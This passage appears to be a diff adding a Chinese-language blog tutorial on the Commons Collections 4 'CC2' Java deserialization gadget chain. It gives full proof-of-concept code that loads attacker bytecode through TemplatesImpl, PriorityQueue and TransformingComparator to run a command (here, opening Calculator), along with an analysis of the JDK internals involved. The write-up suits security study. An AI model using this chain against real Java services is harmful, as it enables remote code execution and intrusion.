+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">EvilTemplatesImpl</span> <span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">              <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;open /System/Applications/Calculator.app&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><ul>
+<li>CC2</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.Transformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC2</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">//取当前目录下的类路径EvilTemplatesImpl.class.getName()，如果在当前目录下可以直接写类名即可
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">EvilTemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()).</span><span class="na">toBytecode</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl">        <span class="o">});</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Transformer</span><span class="o">[]</span>  <span class="n">transformers</span><span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">obj</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;newTransformer&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span><span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="n">transformingComparator</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;size&#34;</span><span class="o">,</span> <span class="n">8</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>那么如果在Transformer数组不可用的情况下怎么改进呢？那么这样一来就不能使用ChainedTransformer类了，我们可以看下TransformingComparator的compare的方法，里面有传入的obj变量：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">compare</span><span class="o">(</span><span class="n">I</span> <span class="n">obj1</span><span class="o">,</span> <span class="n">I</span> <span class="n">obj2</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">O</span> <span class="n">value1</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">transformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">obj1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">O</span> <span class="n">value2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">transformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">obj2</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">decorated</span><span class="o">.</span><span class="na">compare</span><span class="o">(</span><span class="n">value1</span><span class="o">,</span> <span class="n">value2</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>如果我们是这样写InvokerTransformer呢：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//取当前目录下的类路径EvilTemplatesImpl.class.getName()，如果在当前目录下可以直接写类名即可
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">EvilTemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()).</span><span class="na">toBytecode</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl">  <span class="o">});</span>
+</span></span><span class="line"><span class="cl"><span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span><span class="c1">//因为不是反序列化要赋值给_tfactory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;newTransformer&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">).</span><span class="na">transform</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+</span></span></code></pre></div><p>所以我们只要把obj传入到上面compare方法的obj1或者obj2即可，我们顺着回去看下siftDownUsingComparator对compare的调用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">siftDownUsingComparator</span><span class="o">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">,</span> <span class="n">E</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">half</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">1</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="o">(</span><span class="n">k</span> <span class="o">&lt;</span> <span class="n">half</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">child</span> <span class="o">=</span> <span class="o">(</span><span class="n">k</span> <span class="o">&lt;&lt;</span> <span class="n">1</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">right</span> <span class="o">=</span> <span class="n">child</span> <span class="o">+</span> <span class="n">1</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">right</span> <span class="o">&lt;</span> <span class="n">size</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">comparator</span><span class="o">.</span><span class="na">compare</span><span class="o">((</span><span class="n">E</span><span class="o">)</span> <span class="n">c</span><span class="o">,</span> <span class="o">(</span><span class="n">E</span><span class="o">)</span> <span class="n">queue</span><span class="o">[</span><span class="n">right</span><span class="o">])</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span> <span class="o">=</span> <span class="n">right</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">comparator</span><span class="o">.</span><span class="na">compare</span><span class="o">(</span><span class="n">x</span><span class="o">,</span> <span class="o">(</span><span class="n">E</span><span class="o">)</span> <span class="n">c</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="n">0</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">queue</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">c</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">k</span> <span class="o">=</span> <span class="n">child</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">queue</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">x</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>发现c是有下面的代码赋值的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span> <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span><span class="o">];</span>
+</span></span></code></pre></div><p>那么我们只要找谁赋值给queue的，我们了解到PriorityQueue是进行队列排序的，那么肯定是obj1和obj2是要传入进行对比排序的，所以我们找下里面可以接收值的方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231205020814215.png" alt="image-20231205020814215"></p>
+<p>我们发现只有offer里面是有queue赋值的，其他都没有，add方法接收值后还是会调用到offer方法，所以直接利用offer即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">offer</span><span class="o">(</span><span class="n">E</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">e</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">NullPointerException</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">modCount</span><span class="o">++;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">size</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="n">queue</span><span class="o">.</span><span class="na">length</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">grow</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">1</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">queue</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="n">siftUp</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>ok，我们要知道这个步骤是完成了我们对queue赋值，而不是反序列化，但是我们看到queue是有transient属性的，也就是说该变量不参与序列化，也就是不会被存储到序列化文件当中。</p>
+<p>那么这样一来不就自相矛盾吗？那不一定，我们来看下PriorityQueue的writeObject方法，可以看到的是重写后将每个queue进行序列化：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectOutputStream</span> <span class="n">s</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Write out element count, and any hidden stuff
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">s</span><span class="o">.</span><span class="na">defaultWriteObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Write out array length, for compatibility with 1.5 version
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">s</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="n">Math</span><span class="o">.</span><span class="na">max</span><span class="o">(</span><span class="n">2</span><span class="o">,</span> <span class="n">size</span> <span class="o">+</span> <span class="n">1</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Write out all elements in the &#34;proper order&#34;.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>再来看下readObject的方法，这里又把对象逐个读取赋值给回queue数组了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Read in size, and any hidden stuff
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">s</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Read in (and discard) array length
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">size</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Read in all elements.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Elements are guaranteed to be in &#34;proper order&#34;, but the
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// spec has never explained what that might be.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">heapify</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>这样就很好理解了，改进后的代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC2</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">//取当前目录下的类路径EvilTemplatesImpl.class.getName()，如果在当前目录下可以直接写类名即可
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">EvilTemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()).</span><span class="na">toBytecode</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl">        <span class="o">});</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">InvokerTransformer</span> <span class="n">newTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;toString&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="n">newTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="n">transformingComparator</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">offer</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">newTransformer</span><span class="o">,</span> <span class="s">&#34;iMethodName&#34;</span><span class="o">,</span> <span class="s">&#34;newTransformer&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;size&#34;</span><span class="o">,</span> <span class="n">2</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
